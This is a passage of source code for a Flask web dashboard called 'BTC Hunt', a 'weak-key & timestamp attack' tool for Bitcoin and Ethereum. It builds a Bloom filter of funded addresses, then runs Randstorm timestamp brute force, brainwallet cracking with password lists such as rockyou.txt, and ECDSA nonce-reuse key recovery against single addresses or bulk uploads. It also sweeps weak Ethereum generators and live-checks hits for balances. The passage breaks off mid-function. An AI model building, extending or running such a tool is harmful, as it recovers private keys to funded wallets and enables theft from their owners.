.btn.go{border-color:#8fdc9a;
  background:linear-gradient(180deg,#6fbf7a 0%,#4c9c5c 48%,#3a7c49 100%);color:#06170b;
  text-shadow:0 1px 0 rgba(255,255,255,.28)}
.btn.gold{border-color:#e8cd85;
  background:linear-gradient(180deg,#e6c46a 0%,#c9a243 48%,#a5812f 100%);color:#1b1305;
  text-shadow:0 1px 0 rgba(255,255,255,.3)}
.btn.ghost{background:linear-gradient(180deg,#1d2734,#151d27);border-color:var(--line2);
  color:#c9d6e4;text-shadow:none}
.btn.ghost:hover{border-color:var(--cy);color:#fff}
.btn.sm{padding:5px 11px;font-size:11.5px;border-radius:9px;margin:2px 4px 2px 0}
.btn[disabled]{opacity:.45;cursor:not-allowed;transform:none;filter:grayscale(.5)}

/* ── inputs ──────────────────────────────────────────────────────────── */
label{display:block;color:var(--cy);font-size:11.5px;letter-spacing:.5px;
  text-transform:uppercase;margin:12px 0 2px}
input,textarea,select{width:100%;font-family:inherit;font-size:13.5px;color:var(--ink);
  background:linear-gradient(180deg,#0b1118,#0e151d);border:1px solid var(--line2);
  border-radius:9px;padding:9px 10px;margin:3px 0;
  box-shadow:0 2px 5px rgba(0,0,0,.5) inset,0 1px 0 rgba(255,255,255,.04);
  transition:border-color .15s,box-shadow .15s}
input:focus,textarea:focus,select:focus{outline:none;border-color:var(--cy);
  box-shadow:0 0 0 3px rgba(99,211,232,.18),0 2px 5px rgba(0,0,0,.5) inset}
input[type=checkbox]{width:auto;margin:0}
textarea{resize:vertical;min-height:64px}
select{appearance:none;background-image:linear-gradient(45deg,transparent 50%,var(--cy) 50%),
  linear-gradient(135deg,var(--cy) 50%,transparent 50%);
  background-position:calc(100% - 16px) 55%,calc(100% - 11px) 55%;
  background-size:5px 5px,5px 5px;background-repeat:no-repeat}
.inline{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px}

/* ── era widget ──────────────────────────────────────────────────────── */
.eras{display:grid;gap:10px;margin:10px 0}
.era{display:grid;grid-template-columns:auto minmax(0,1fr);gap:4px 12px;
  align-items:start;padding:12px 14px;border-radius:12px;
  border:1px solid var(--line);background:linear-gradient(180deg,#131b24,#0f161e);
  box-shadow:0 6px 16px rgba(0,0,0,.35),0 1px 0 rgba(255,255,255,.04) inset;
  transition:border-color .18s,transform .12s,box-shadow .18s}
.era:hover{border-color:var(--line2);transform:translateY(-1px)}
.era.on{border-color:rgba(99,211,232,.55);
  box-shadow:0 6px 18px rgba(0,0,0,.4),0 0 0 1px rgba(99,211,232,.22),
  0 1px 0 rgba(255,255,255,.05) inset}
.era.off{opacity:.62}
.era>input[type=checkbox]{margin-top:5px;width:17px;height:17px;accent-color:var(--cy)}
.era .tt{font-weight:700;color:#e8f2fb;font-size:13.5px}
.era .nn{font-size:11px;letter-spacing:.7px;text-transform:uppercase;color:var(--vio)}
.era .win{color:var(--dim);font-size:12px}
.era .ctl{display:flex;gap:8px;flex-wrap:wrap;align-items:flex-end;margin-top:8px}
.era .ctl>div{min-width:132px;flex:1 1 132px}
.era .ctl label{margin:0 0 2px;font-size:10px}
.era .ctl input{padding:6px 8px;font-size:12.5px}
.pill{display:inline-block;font-size:10.5px;font-weight:700;letter-spacing:.4px;
  padding:2px 8px;border-radius:999px;border:1px solid;margin:2px 4px 2px 0}
.pill.ok{color:var(--gr);border-color:rgba(121,209,127,.5);background:rgba(121,209,127,.10)}
.pill.warn{color:var(--am);border-color:rgba(240,193,75,.5);background:rgba(240,193,75,.10)}
.pill.bad{color:var(--rd);border-color:rgba(240,104,122,.5);background:rgba(240,104,122,.10)}
.pill.info{color:var(--cy);border-color:rgba(99,211,232,.45);background:rgba(99,211,232,.10)}
details{margin:6px 0 0;border-top:1px dashed var(--line);padding-top:6px}
summary{cursor:pointer;color:var(--cy);font-size:11.5px;letter-spacing:.4px;
  text-transform:uppercase;list-style:none}
summary::-webkit-details-marker{display:none}
summary::before{content:"▸ ";color:var(--dim)}
details[open] summary::before{content:"▾ "}
details .muted{margin-top:6px}

/* ── recipes ─────────────────────────────────────────────────────────── */
.recipes{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));
  gap:9px;margin:10px 0}
label.rec{display:block;margin:0;padding:11px 12px;border-radius:11px;text-transform:none;
  letter-spacing:0;font-size:12.6px;color:var(--ink);border:1px solid var(--line);
  background:linear-gradient(180deg,#131b24,#0f161e);cursor:pointer;
  box-shadow:0 4px 12px rgba(0,0,0,.32),0 1px 0 rgba(255,255,255,.04) inset;
  transition:border-color .18s,opacity .18s,transform .12s}
label.rec:hover{border-color:var(--line2);transform:translateY(-1px)}
label.rec.sel{border-color:rgba(121,209,127,.6);
  box-shadow:0 4px 14px rgba(0,0,0,.35),0 0 0 1px rgba(121,209,127,.22)}
label.rec.dim{opacity:.45}
label.rec input{width:auto;margin:0 7px 0 0;vertical-align:middle;accent-color:var(--gr)}
label.rec b{color:#e8f2fb}

/* ── progress + logs ─────────────────────────────────────────────────── */
.bar{position:relative;height:15px;border-radius:999px;margin:9px 0 6px;overflow:hidden;
  background:linear-gradient(180deg,#080d13,#0c1219);border:1px solid var(--line);
  box-shadow:0 2px 6px rgba(0,0,0,.6) inset}
.bar>div{height:100%;width:0;border-radius:999px;position:relative;
  background:linear-gradient(90deg,#3f8f52,#79d17f 55%,#63d3e8);
  box-shadow:0 0 14px rgba(121,209,127,.5);transition:width .4s ease}
.bar>div::after{content:"";position:absolute;inset:0;border-radius:999px;
  background-image:repeating-linear-gradient(115deg,rgba(255,255,255,.20) 0 9px,
    transparent 9px 18px);background-size:200% 100%;animation:slide 1.1s linear infinite}
@keyframes slide{from{background-position:0 0}to{background-position:-36px 0}}
pre{position:relative;background:linear-gradient(180deg,#070b10,#0a0f15);color:#c6d3e0;
  border:1px solid var(--line);border-radius:11px;padding:11px 12px;margin:8px 0 0;
  overflow:auto;max-height:340px;font-size:12px;line-height:1.5;
  box-shadow:0 6px 18px rgba(0,0,0,.45) inset;white-space:pre-wrap;word-break:break-word}
pre::-webkit-scrollbar{width:10px;height:10px}
pre::-webkit-scrollbar-thumb{background:#26313f;border-radius:99px;border:2px solid #0a0f15}
pre::-webkit-scrollbar-thumb:hover{background:#3a4a5e}
pre::-webkit-scrollbar-track{background:#0a0f15}
body::-webkit-scrollbar{width:12px}
body::-webkit-scrollbar-thumb{background:#222c39;border-radius:99px;border:3px solid var(--bg)}
body::-webkit-scrollbar-track{background:var(--bg)}

/* ── badges + messages ───────────────────────────────────────────────── */
.badge{display:inline-block;padding:3px 10px;border-radius:999px;font-size:11.5px;
  font-weight:700;border:1px solid;letter-spacing:.2px}
.badge.ok{color:#b6f0bb;border-color:rgba(121,209,127,.6);background:rgba(121,209,127,.13);
  box-shadow:0 0 14px rgba(121,209,127,.18)}
.badge.bad{color:#ffc9d1;border-color:rgba(240,104,122,.6);background:rgba(240,104,122,.13);
  box-shadow:0 0 14px rgba(240,104,122,.16)}
.badge.warn{color:#ffe6a8;border-color:rgba(240,193,75,.6);background:rgba(240,193,75,.13);
  box-shadow:0 0 14px rgba(240,193,75,.16)}
.msg{padding:11px 13px;border-radius:11px;margin:12px 0;font-size:13px;
  border:1px solid transparent;box-shadow:0 6px 18px rgba(0,0,0,.35)}
.msg:empty{display:none}
.msg.ok{color:#c8f5cd;background:linear-gradient(180deg,rgba(121,209,127,.16),rgba(121,209,127,.07));
  border-color:rgba(121,209,127,.5)}
.msg.err{color:#ffd7dd;background:linear-gradient(180deg,rgba(240,104,122,.16),rgba(240,104,122,.07));
  border-color:rgba(240,104,122,.5)}
.footer{color:var(--dim);font-size:11.5px;text-align:center;padding-top:6px}
.footer b{color:var(--cy)}

@media (max-width:760px){
  body{padding:0 12px 28px}
  .topbar{margin:0 -12px 14px;padding:10px 12px 8px}
  :root{--stick:158px}
  .chips{margin-left:0;width:100%}
  .grid,.recipes{grid-template-columns:1fr}
  .era{grid-template-columns:auto minmax(0,1fr)}
}
@media (prefers-reduced-motion:reduce){
  html{scroll-behavior:auto}
  *{animation:none!important;transition:none!important}
}
</style>
<script>
// Short JSON polls instead of long-lived SSE streams. SSE generators used to
// loop forever and exhaust Gunicorn's worker threads, which made the whole
// dashboard appear frozen after a few tabs were opened.
function notify(text, ok){
  const m=document.getElementById('msg');
  if(!m)return;
  m.textContent=text||'';
  m.className='msg '+(text?(ok?'ok':'err'):'');
}
function post(url, body){
  const init={method:'POST',cache:'no-store',headers:{'Content-Type':'application/json'}};
  if(body!==undefined) init.body=JSON.stringify(body);
  return fetch(url,init)
    .then(r=>{
      if(!r.ok) throw new Error('HTTP '+r.status+
        (r.status===401?' (login expired — reload this page)':''));
      return r.json();
    })
    .then(d=>{ notify(d.msg||(d.ok?'started':'failed'), !!d.ok); return d; })
    .catch(e=>{ notify('Request failed: '+e.message,false); return {ok:false,msg:e.message}; });
}
function stop(name){ post('/api/stop/'+encodeURIComponent(name), {}); }
function killAll(){
  if(!confirm('Stop every running job, clear the auto-deploy deferral, and restart the worker? Saved hits and the dataset are kept.')) return;
  // Even if the worker dies before fetch() resolves, reload into the new one.
  setTimeout(function(){ location.reload(); }, 2200);
  post('/api/jobs/kill-all',{restart:true}).then(function(d){
    if(d.ok && !d.restarting) location.reload();
  });
}
// The card headers lock to the bottom edge of the sticky bar, so --stick has
// to be that bar's real height: it wraps differently per page and per width.
function refreshSticky(){
  const bar=document.querySelector('.topbar');
  if(bar) document.documentElement.style.setProperty(
    '--stick', (bar.offsetHeight+10)+'px');
}
refreshSticky();
window.addEventListener('resize', refreshSticky);
window.addEventListener('load', refreshSticky);
// Sticky-header status chip: how many jobs are alive, on every page.
function refreshChip(){
  fetch('/api/jobs',{cache:'no-store'})
    .then(function(r){ return r.json(); })
    .then(function(d){
      const el=document.querySelector('#jobs-chip b');
      if(!el) return;
      const jobs=d.jobs||{}; let n=0;
      Object.keys(jobs).forEach(function(k){ if(jobs[k].alive) n++; });
      el.textContent=n?(n+' running'):'idle';
      el.style.color=n?'#f0c14b':'#79d17f';
    }).catch(function(){});
}
refreshChip(); setInterval(refreshChip, 3000);
function watch(name, sfx){
  sfx=sfx||'';
  let since=0, lines=[], delay=1000;
  const NL=String.fromCharCode(10);
  const bar=document.getElementById('bar'+sfx),
        detail=document.getElementById('detail'+sfx),
        log=document.getElementById('log'+sfx);
  function tick(){
    fetch('/api/job/'+encodeURIComponent(name)+'?since='+since,{cache:'no-store'})
      .then(r=>{ if(!r.ok) throw new Error('HTTP '+r.status); return r.json(); })
      .then(d=>{
        since=d.log_len||0;
        if(d.log && d.log.length){
          lines=lines.concat(d.log);
          if(lines.length>300) lines=lines.slice(-300);
          if(log){ log.textContent=lines.join(NL); log.scrollTop=log.scrollHeight; }
        }
        if(bar) bar.style.width=(Math.min(1,Math.max(0,d.progress||0))*100).toFixed(1)+'%';
        if(detail){
          detail.textContent=d.error ? 'ERROR: '+d.error :
                             (d.detail || (d.alive?'running…':'not started'));
          detail.className=d.error?'status-bad':'muted';
        }
        delay=(d.alive||d.exists)?1000:3000;
      })
      .catch(e=>{ if(detail) detail.textContent='status unavailable: '+e.message; delay=3000; })
      .finally(()=>setTimeout(tick,delay));
  }
  tick();
}
</script>
</head><body>
<header class="topbar">
<div class="toprow">
<h1>₿ BTC Hunt<span class="sub">weak-key &amp; timestamp attack dashboard ·
BTC + ETH</span></h1>
<div class="chips">
<span class="chip">build <b>{build_id}</b></span>
<span class="chip">ec <b>{ec_backend}</b></span>
<span class="chip">keccak <b>{keccak_backend}</b></span>
<span class="chip" id="jobs-chip">jobs <b>…</b></span>
</div>
</div>
<nav class="nav">{nav}<span class="spacer"></span>
<button class="btn danger sm" onclick="killAll()">⏻ Kill all jobs</button></nav>
</header>
<div id="msg" class="msg"></div>
{body}
<hr>
<p class="footer">build <b>{build_id}</b> · started {started_at} · EC
{ec_backend} · keccak {keccak_backend}{deploy_note}</p>
</body></html>
"""

NAV_ITEMS = (("/", "home"), ("/data", "dataset"), ("/randstorm", "randstorm"),
             ("/brain", "brainwallet"), ("/nonce", "nonce reuse"),
             ("/eth", "ethereum"), ("/results", "results"))


def _nav_html():
    """Nav pills with the current page marked, so the locked header orients."""
    try:
        here = request.path or "/"
    except Exception:
        here = "/"
    out = []
    for path, label in NAV_ITEMS:
        on = (here == path) or (path != "/" and here.startswith(path + "/"))
        out.append('<a href="%s"%s>%s</a>'
                   % (path, ' class="on"' if on else "", html.escape(label)))
    return "".join(out)


def page(body):
    note = ""
    if BUSY_FILE.exists():
        try:
            names = BUSY_FILE.read_text(encoding="utf-8").strip()
            note = (" · auto-deploy deferred while job(s) run: "
                    + html.escape(names or "unknown"))
        except OSError:
            note = " · auto-deploy deferred while a job runs"
    return (PAGE.replace("{body}", body)
                .replace("{nav}", _nav_html())
                .replace("{build_id}", html.escape(BUILD_ID))
                .replace("{started_at}", html.escape(STARTED_AT))
                .replace("{ec_backend}", html.escape(EC_BACKEND))
                .replace("{keccak_backend}", html.escape(ETH_HASH_BACKEND))
                .replace("{deploy_note}", note))

@app.after_request
def _html_no_store(resp):
    # Dashboard HTML must never be served from a browser back/forward cache:
    # after a deploy that would silently show the previous page layout.
    if resp.mimetype == "text/html":
        resp.headers["Cache-Control"] = "no-store, max-age=0"
    return resp

@app.route("/")
def home():
    dataset = BLOOM_PATH.exists()
    # Built outside the f-string so the JS braces do not need doubling.
    era_rows = []
    for e in ETH_ERAS:
        span = e["end"] - e["start"] + 1
        tag = ("<span class='pill bad'>not privkey-recoverable</span>"
               if not e.get("scannable", True) else
               ("<span class='pill warn'>%s</span>" % html.escape(e["warn"])
                if e.get("warn") else
                "<span class='pill ok'>scannable</span>"))
        era_rows.append(
            "<div class='era%s'><div><div class='nn'>%s · unit %s · %s wide"
            "</div><div class='tt'>%s</div><div class='win'>%s &nbsp;·&nbsp; "
            "<code>%d</code> → <code>%d</code> %s</div></div></div>" % (
                " on" if e["default"] else " off", html.escape(e["era"]),
                html.escape(e["unit"]), format(span, ","),
                html.escape(e["label"]), html.escape(e["window"]),
                e["start"], e["end"], tag))
    default_eras = [e["id"] for e in ETH_ERAS if e["default"]]
    default_recs = [r for r, v in ETH_RECIPES.items() if v["default"]]
    era_home = """
<div class="card accent-green"><h2>Ethereum era batch <span class="tag">fixed
windows · one job</span></h2>
<p class="muted">The documented weak-key eras as fixed scan values.
<b>%(defl)s</b> run in one job, one after another, %(steps)s timestamps each
(<code>ETH_ERA_STEPS</code>) — a <i>slice</i> of each era, never the whole
window: Era 3 alone is %(span3)s timestamps wide. Tick, budget and offset each
era on <a href="/eth#era">/eth</a>.</p>
<div class="eras">%(rows)s</div>
<div class="row">
<button class="btn go" onclick="startEraHome()">▶ Start era batch</button>
<button class="btn danger" onclick="stop('eth_era')">■ Stop</button>
<a class="btn ghost sm" href="/eth#era">configure eras</a>
<span class="tiny">%(neras)s eras · recipes %(recs)s · cap %(cap)s steps/run</span>
</div>
<div class="bar"><div id="barEraH" style="width:0%%"></div></div>
<p id="detailEraH" class="muted"></p><pre id="logEraH"></pre>
</div>
<script>
function startEraHome(){
  post('/api/eth/era',{eras:%(eras_json)s, recipes:%(recs_json)s,
                       steps:%(steps_raw)s});
}
watch('eth_era','EraH');
</script>""" % {
        "defl": html.escape(", ".join(default_eras)),
        "neras": len(ETH_ERAS),
        "steps": format(ETH_ERA_STEPS, ","),
        "steps_raw": ETH_ERA_STEPS,
        "span3": format(ETH_ERAS[2]["end"] - ETH_ERAS[2]["start"] + 1, ","),
        "rows": "".join(era_rows),
        "recs": html.escape(", ".join(default_recs)),
        "cap": format(ETH_MAX_TOTAL_STEPS, ","),
        "eras_json": json.dumps(default_eras),
        "recs_json": json.dumps(default_recs),
    }
    body = f"""
<div class="card">
<h2>Dataset</h2>
<p>{'<span class="status-ok">✓ bloom filter ready</span>' if dataset else
'<span class="status-bad">✗ no bloom — visit /data first</span>'}</p>
</div>
<div class="card"><h2>Jobs</h2>
<p id="jobs-summary" class="muted">checking…</p>
<p class="muted">The header <b>Kill all jobs</b> button stops dataset,
Randstorm, brainwallet, nonce-reuse, Ethereum and balance-check jobs at once, clears the
auto-deploy marker and restarts the Gunicorn worker for a clean slate. Saved
hits, the Bloom filter and the cached .gz are <b>not</b> deleted.</p>
</div>
<div class="grid">
<div class="card"><h2>1. Randstorm</h2>
<p class="muted">BitcoinJS-lib v0.1.3 (2011–2015) used Math.random()
instead of crypto.getRandomValues. Iterating millisecond timestamps
reproduces the private key.</p>
<a class="btn" href="/randstorm">Open</a></div>
<div class="card"><h2>2. Brainwallet</h2>
<p class="muted">SHA256(passphrase) → private key. Human passphrases
have ~40 bits of entropy. 130k pw/s against a bloom filter finds the
weak ones.</p>
<a class="btn" href="/brain">Open</a></div>
<div class="card"><h2>3. Nonce Reuse</h2>
<p class="muted">Two ECDSA signatures sharing r ⇒ recover k and d
algebraically. Scan one address or upload a .txt list of thousands via
Blockstream Esplora; hits are stored in SQLite.</p>
<a class="btn" href="/nonce">Open</a></div>
<div class="card"><h2>4. Ethereum</h2>
<p class="muted">Same curve, Keccak-256 addresses, no bloom: derived
candidates are checked live over batched JSON-RPC. Timestamp sweeps
(seconds or ms) for weak generators such as the Trust Wallet
Mersenne-Twister seed, plus sequential/weak private keys.</p>
<a class="btn" href="/eth">Open</a></div>
</div>
{era_home}
<script>
function refreshJobs(){{
  fetch('/api/jobs',{{cache:'no-store'}}).then(function(r){{return r.json();}}).then(function(d){{
    var el=document.getElementById('jobs-summary'); if(!el)return;
    var running=[], jobs=d.jobs||{{}};
    Object.keys(jobs).forEach(function(k){{
      if(jobs[k].alive) running.push(k+': '+(jobs[k].detail||'running'));
    }});
    el.textContent=running.length?running.join(' · '):'no jobs running';
  }}).catch(function(){{}});
}}
refreshJobs(); setInterval(refreshJobs, 2000);
</script>"""
    return page(body)

@app.route("/data")
def data_page():
    status = {
        "bloom": BLOOM_PATH.exists(),
        "gz": ADDR_GZ.exists(),
        "bloom_size": BLOOM_PATH.stat().st_size if BLOOM_PATH.exists() else 0,
        "gz_size": ADDR_GZ.stat().st_size if ADDR_GZ.exists() else 0,
    }
    if DATASET_MIN_BALANCE <= -1:
        balance_note = "disabled (all rows kept)"
    else:
        balance_note = f"keep rows with balance &gt; {DATASET_MIN_BALANCE:g}"
    est_mb = (-51_000_000 * math.log(BLOOM_FP_RATE) /
              (math.log(2) ** 2) / 8 / 1e6)
    body = f"""
<div class="card"><h2>Dataset status</h2>
<p>cached dataset (.gz): {'✓ ' + f'{status["gz_size"]/1e9:.2f} GB' if status['gz']
else '✗ not downloaded'}</p>
<p>funded.bloom: {'✓ ' + f'{status["bloom_size"]/1e6:.0f} MB' if status['bloom']
else '✗ not built'}</p>
<label>Dataset URL (optional — tried first, before the built-in mirrors)</label>
<input id="u" placeholder="https://example.com/bitcoin.hex.gz">
<button class="btn" onclick="startDataset(false)">Download &amp; build bloom</button>
<button class="btn" onclick="startDataset(true)">Re-download &amp; rebuild</button>
<button class="btn danger" onclick="stop('dataset')">Stop</button>
<p class="muted">Tries LoyceV's dated balance TSVs first (its LATEST direct
download was disabled in 2026), then text dumps and other public mirrors.
The balance TSV is ~1.7 GB; smaller text/hex dumps are fallbacks. Set
DATASET_PREFER_BALANCE_TSV=0 to prefer the smaller text dump. Budget:
{BUILD_DEADLINE_SECS // 60} min total, {DOWNLOAD_DEADLINE_SECS // 60} min for
the download. Bloom FP rate: {BLOOM_FP_RATE:g} (~{est_mb:.0f} MB bitset at 51M
rows); changing BLOOM_FP_RATE needs a rebuild — Download &amp; build bloom
reuses the cached .gz. Balance filter: {balance_note}
(set DATASET_MIN_BALANCE=-1 to keep zero balances). To replace an already
cached text dump with a balance TSV, click Re-download &amp; rebuild. You can
also copy a .gz to {DATA_DIR}/blockchair.tsv.gz and click Download — the
cached file is used without re-downloading. Progress and the live log are
below.</p>
</div>
<div class="card"><h2>Progress</h2>
<div class="bar"><div id="bar" style="width:0%"></div></div>
<p id="detail" class="muted">not started</p><pre id="log"></pre>
</div>
<script>
function startDataset(force){{
  const u=document.getElementById('u').value.trim();
  const d={{force:force}};
  if(u) d.url=u;
  post('/api/dataset',d);
}}
watch('dataset');
</script>"""
    return page(body)

@app.route("/api/dataset", methods=["POST"])
def api_dataset():
    j = request.get_json(silent=True)
    if not isinstance(j, dict):
        j = {}
    force = bool(j.get("force"))
    raw_url = j.get("url")
    custom = raw_url.strip() if isinstance(raw_url, str) else ""
    if custom and not re.match(r"^https?://", custom, re.I):
        return {"ok": False, "msg": "dataset URL must start with http:// or https://"}
    with _JOBS_LOCK:
        busy = "dataset" in _JOBS and _JOBS["dataset"]["alive"]
    if busy:
        return {"ok": False, "msg": "a dataset job is already running"}
    if force:
        ADDR_GZ.unlink(missing_ok=True)
        Path(str(ADDR_GZ) + ".part").unlink(missing_ok=True)
    # None => use the default list plus automatic LoyceV dated-snapshot
    # discovery. A custom URL is tried first, with the defaults as fallbacks.
    sources = [custom] + DATASET_URLS if custom else None

    def runner(job, log):
        def progress(frac, detail):
            job["progress"] = max(0.0, min(1.0, frac))
            job["detail"] = detail
        try:
            build_bloom(log, progress, lambda: job["stop"], sources)
            job["progress"] = 1.0
            job["detail"] = "done — bloom filter ready"
            log("[✓] dataset ready")
        except Exception as e:
            if str(e) == "cancelled":
                job["detail"] = "stopped by user"
                log("[!] cancelled by user")
            else:
                job["error"] = str(e)
                log(f"[!] {e}")
    ok, msg = _start_job("dataset", runner)
    return {"ok": ok, "msg": msg}

@app.route("/randstorm")
def rs_page():
    body = """
<div class="card"><h2>Randstorm — timestamp range</h2>
<label>Start (ms since epoch)</label>
<input id="s" value="1293840000000">
<label>End (ms since epoch)</label>
<input id="e" value="1293840001000">
<p class="muted">2011-01-01 → 2015-01-01 is the vulnerable window, and that is
126 billion timestamps. <b>Any range is accepted</b> — nothing is refused. A run
wider than {chunk_ms} ms is split into batches of at most {chunk_ms} ms
(<code>RANDSTORM_MAX_MS</code>) and the batches run in order, each logging
<code>chunk i/N</code>: 126 billion ms is {full_chunks} batches, about
{full_eta} of CPU. Above {total_ms} ms (<code>RANDSTORM_MAX_TOTAL_MS</code>,
≈{total_days} days, {total_chunks} batches) the start reply adds that estimate
instead of blocking the run. Progress, chunk number, hits and ETA stay visible,
and Stop ends it cleanly between or inside a batch while keeping everything
found so far. Bloom
candidates are live-checked for balance as found; zero-balance addresses are
skipped by default. At BLOOM_FP_RATE=1e-6 expect roughly 3 false candidates per
million timestamps, each costing one paced explorer request.</p>
<button class="btn" onclick="start()">Start</button>
<button class="btn danger" onclick="stop('randstorm')">Stop</button>
</div>
<div class="card"><h2>Progress</h2>
<div class="bar"><div id="bar" style="width:0%"></div></div>
<p id="detail" class="muted"></p><pre id="log"></pre>
</div>
<script>
function start(){
  const s=parseInt(document.getElementById('s').value,10),
        e=parseInt(document.getElementById('e').value,10);
  post('/api/randstorm',{start:s,end:e});
}
watch('randstorm');
</script>"""
    # Placeholders, not an f-string: the body is full of JS/CSS braces.
    body = (body
            .replace("{chunk_ms}", f"{RANDSTORM_MAX_MS:,}")
            .replace("{total_chunks}",
                     f"{-(-RANDSTORM_MAX_TOTAL_MS // max(1, RANDSTORM_MAX_MS)):,}")
            .replace("{total_days}",
                     f"{RANDSTORM_MAX_TOTAL_MS / _MS_PER_DAY:.1f}")
            # 2011-01-01 -> 2015-01-01 is 1461 days = 126,230,400,000 ms.
            .replace("{full_chunks}",
                     f"{-(-126_230_400_000 // max(1, RANDSTORM_MAX_MS)):,}")
            .replace("{full_eta}", _human_secs(126_230_400_000 / RANDSTORM_RATE))
            .replace("{total_ms}", f"{RANDSTORM_MAX_TOTAL_MS:,}"))
    return page(body)

@app.route("/api/randstorm", methods=["POST"])
def api_rs():
    if not BLOOM_PATH.exists():
        return {"ok": False,
                "msg": "bloom not built — build it on the /data page first"}
    j = request.get_json(silent=True) or {}
    try:
        start, end = int(j["start"]), int(j["end"])
    except (KeyError, TypeError, ValueError):
        return {"ok": False, "msg": "start and end must be integer ms timestamps"}
    if end < start:
        return {"ok": False, "msg": "end must be >= start"}
    try:
        bf = BloomFilter.load(BLOOM_PATH)
    except Exception as e:
        return {"ok": False, "msg": f"cannot load bloom filter: {e}"}
    ok, msg = _start_job("randstorm", attack_randstorm, start, end, bf)
    if ok:
        # Every range is accepted now: big ones just run batch after batch.
        # Past RANDSTORM_MAX_TOTAL_MS the reply also says what that means in
        # wall-clock time, because "126 billion timestamps" is not a number
        # anyone can picture.
        span = end - start + 1
        if span > RANDSTORM_MAX_TOTAL_MS:
            msg = "%s — %s" % (msg, _batch_note(span, RANDSTORM_MAX_MS, "ms",
                                                RANDSTORM_RATE))
        elif span > RANDSTORM_MAX_MS:
            msg = "%s — %s" % (msg, _batch_note(span, RANDSTORM_MAX_MS, "ms"))
    return {"ok": ok, "msg": msg, "batches": _batch_count(
        end - start + 1, RANDSTORM_MAX_MS)}

@app.route("/brain")
def brain_page():
    body = """
<div class="card"><h2>Brainwallet — passphrase file</h2>
<label>Upload .txt (one passphrase per line)</label>
<input type="file" id="f" accept=".txt">
<button class="btn" onclick="start()">Start</button>
<button class="btn danger" onclick="stop('brainwallet')">Stop</button>
<p class="muted">Try rockyou.txt, common English phrases, or
custom lists. Max ~130k pw/s against bloom.</p>
</div>
<div class="card"><h2>Progress</h2>
<div class="bar"><div id="bar" style="width:0%"></div></div>
<p id="detail" class="muted"></p><pre id="log"></pre>
</div>
<script>
function start(){
  const file=document.getElementById('f').files[0];
  if(!file){alert('pick a file');return}
  const reader=new FileReader();
  reader.onload=()=>{
    post('/api/brain',{data:reader.result});
  };
  reader.readAsText(file);
}
watch('brainwallet');
</script>"""
    return page(body)

@app.route("/api/brain", methods=["POST"])
def api_brain():
    if not BLOOM_PATH.exists():
        return {"ok": False,
                "msg": "bloom not built — build it on the /data page first"}
    j = request.get_json(silent=True) or {}
    lines = [ln.strip() for ln in (j.get("data") or "").splitlines() if ln.strip()]
    if not lines:
        return {"ok": False, "msg": "no passphrases (pick a .txt file first)"}
    try:
        bf = BloomFilter.load(BLOOM_PATH)
    except Exception as e:
        return {"ok": False, "msg": f"cannot load bloom filter: {e}"}
    ok, msg = _start_job("brainwallet", attack_brainwallet, lines, bf)
    return {"ok": ok, "msg": msg}

@app.route("/nonce")
def nonce_page():
    body = """
<div class="card"><h2>Nonce reuse — single address</h2>
<label>Bitcoin address</label>
<input id="a" placeholder="1... or bc1...">
<button class="btn" onclick="scanOne()">Scan</button>
<p class="muted">Fetches all txs via Blockstream Esplora, finds
repeated r values, recovers the private key.</p>
</div>
<div class="card"><h2>Nonce reuse — bulk upload</h2>
<label>Upload .txt (one address per line; CSV/TSV first column is OK)</label>
<input type="file" id="f" accept=".txt,.csv">
<button class="btn" onclick="scanFile()">Scan file</button>
<button class="btn danger" onclick="stop('nonce')">Stop</button>
<p id="count" class="muted"></p>
<p class="muted">Blank lines, # comments, duplicate lines and everything after
the first column are ignored; invalid lines are counted in the status message.
Both legacy 1.../3... and bech32 bc1... addresses are accepted. Requests are
paced (default 0.3 s each) and cached; on HTTP 429 the whole scan cools down
(honouring Retry-After) instead of silently skipping addresses. A few thousand
addresses against the public API takes hours, not minutes. Any address still
unchecked is saved to nonce_retry.txt on the data disk for re-upload. Only
legacy P2PKH spends are parsed — segwit witness and taproot signatures are not
supported yet, and Esplora returns just the most recent 25 txs per address.
A recovered key that does not reproduce the target address is logged but not
saved. Hits appear on /results.</p>
</div>
<div class="card"><h2>Progress</h2>
<div class="bar"><div id="bar" style="width:0%"></div></div>
<p id="detail" class="muted"></p><pre id="log"></pre>
</div>
<script>
function scanOne(){
  const a=document.getElementById('a').value.trim();
  post('/api/nonce',{address:a});
}
function scanFile(){
  const file=document.getElementById('f').files[0];
  if(!file){alert('pick a .txt file');return}
  const reader=new FileReader();
  reader.onload=()=>{ post('/api/nonce/bulk',{data:reader.result}); };
  reader.readAsText(file);
}
document.getElementById('f').addEventListener('change',function(){
  const file=this.files[0], out=document.getElementById('count');
  if(!file){out.textContent='';return}
  out.textContent='selected '+file.name+' ('+file.size.toLocaleString()+' bytes)';
});
watch('nonce');
</script>"""
    return page(body)

@app.route("/api/nonce", methods=["POST"])
def api_nonce():
    j = request.get_json(silent=True) or {}
    addr = _normalise_address(j.get("address"))
    if not addr: return {"ok": False, "msg": "enter a Bitcoin address first"}
    if not _valid_address(addr):
        return {"ok": False, "msg": "that does not look like a mainnet Bitcoin address"}
    ok, msg = _start_job("nonce", attack_nonce_reuse, addr)
    return {"ok": ok, "msg": msg}

@app.route("/api/nonce/bulk", methods=["POST"])
def api_nonce_bulk():
    """Start a bulk nonce-reuse scan from an uploaded text/CSV file."""
    j = request.get_json(silent=True) or {}
    data = j.get("data")
    if data is None:
        raw = j.get("addresses")
        data = "\n".join(str(x) for x in raw) if isinstance(raw, list) else ""
    if not isinstance(data, str):
        return {"ok": False, "msg": "upload a .txt file (or send an addresses array)"}
    if len(data.encode("utf-8", "ignore")) > NONCE_MAX_UPLOAD_BYTES:
        return {"ok": False,
                "msg": f"file too large (max {NONCE_MAX_UPLOAD_BYTES:,} bytes)"}
    addresses, skipped, duplicates = _parse_address_lines(data)
    if not addresses:
        return {"ok": False, "msg": "no valid Bitcoin addresses found in the file"}
    if len(addresses) > NONCE_MAX_ADDRESSES:
        return {"ok": False,
                "msg": (f"{len(addresses):,} addresses exceeds the "
                        f"NONCE_MAX_ADDRESSES={NONCE_MAX_ADDRESSES:,} cap — "
                        "split the file or raise the cap")}
    ok, msg = _start_job("nonce", attack_nonce_reuse_bulk, addresses)
    if ok:
        extras = []
        if skipped: extras.append(f"{skipped:,} invalid line(s) skipped")
        if duplicates: extras.append(f"{duplicates:,} duplicate(s) skipped")
        msg = (f"started {len(addresses):,} addresses"
